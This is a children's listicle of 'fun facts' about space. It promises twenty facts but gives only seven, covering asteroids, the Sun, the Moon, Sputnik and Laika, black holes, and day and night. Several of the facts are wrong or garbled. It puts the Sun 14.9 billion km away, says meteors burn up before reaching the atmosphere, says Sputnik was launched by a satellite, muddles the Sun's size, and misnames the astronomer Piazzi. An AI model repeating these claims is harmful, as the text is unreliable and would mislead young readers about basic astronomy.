Ever wondered about the Sun, stars, moon or asteroids and felt that it never made sense? Fret not, we’ve got you covered. Here are 20 interesting facts about space for kids which will leave you mesmerized by the mysteries and wonders of the universe.

1. Asteroids
An asteroid speeds down into the Earth’s stratosphere every year, but luckily, it burns up to smithereens before it reaches the atmosphere. Lucky for us! Here’s another fun fact about asteroids- the first asteroid was discovered in 1801 by an Italian Mathematician and Astronomer called Giuseppe Piazza. The asteroid was known as ‘Ceres.’ Most asteroids are composed of rocks and metals.

2. Tire Tracks on The Moon
There are tire tracks and signs of mankind’s footsteps on the Moon. The reason for this is because no winds blow on the moon.

3. The Sun
It takes more than a million Earth-sized planets to fill up the sun! Not just that but the sun is considered approximately 300000 times larger than the earth and is 14.9 billion km away! It has been forecasted that there will come a day when the Earth will be consumed by the sun.

4. Manmade Objects in Space
The first manmade object to enter space was launched by a Russian satellite named Sputnik back in 1957! ‘Sputnik 2’ was launched by the USSR on November 3, 1957, and a homeless dog named ‘Laika’ was launched along with it. Laika was the first dog to enter space but passed away unfortunately since the satellite couldn’t make it back to Earth.

5. Why The Moon Glows and Tracks Us
It’s a fascinating fact indeed that the sun’s rays bounce off of the Moon’s surface which later is passed on to the Earth, thus making it appear as if the moon is glowing. What makes this even more fascinating? It takes only 1.25 seconds for the moon to do just that!

6. Spaghettification
Do you love spaghetti? Well, that’s what any human will turn into once he lands inside a black hole in space. ‘Spaghettification,’ is when you’re literally, we quote, “pulled and ripped apart” by gravitational forces when landing inside a black hole. This makes it impossible for lifeforms to survive in black holes.

7. Day And Night
The Earth rotates on an invisible axis and orbits around the sun just like the other seven planets in the Solar System. Day and night occur depending on which side of the earth faces the sun. The Earth takes 24 hours to make one complete rotation which leads to days and nights on our planet.
